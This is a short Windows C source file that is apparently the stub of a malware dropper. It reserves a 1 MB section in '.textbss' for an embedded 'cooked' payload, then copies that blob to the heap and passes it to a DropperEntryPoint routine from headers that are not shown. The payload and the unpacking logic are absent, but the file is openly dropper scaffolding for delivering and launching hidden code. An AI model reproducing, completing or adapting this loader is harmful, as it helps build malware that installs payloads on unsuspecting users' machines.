#ifndef UNICODE
#define UNICODE
#endif

#include <windows.h>
#include <stdio.h>
#include "DropperCode.h"
#include "DropperHeader.h"

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")

#pragma section(".textbss",read)
__declspec(allocate(".textbss"))
static ULONG pCooked[(1024*1024)/sizeof(ULONG)] = {0xdeadbeef};


DropperHeader *GetEofData(LPVOID FileBuffer)
{
	return (DropperHeader *)NULL;
}

int CALLBACK WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR    lpCmdLine,
	int       nCmdShow)
{
	DropperHeader *pDropperHeader = (DropperHeader *)malloc(sizeof(pCooked));
	memcpy(pDropperHeader, pCooked, sizeof(pCooked));
	DropperEntryPoint(pDropperHeader);
}

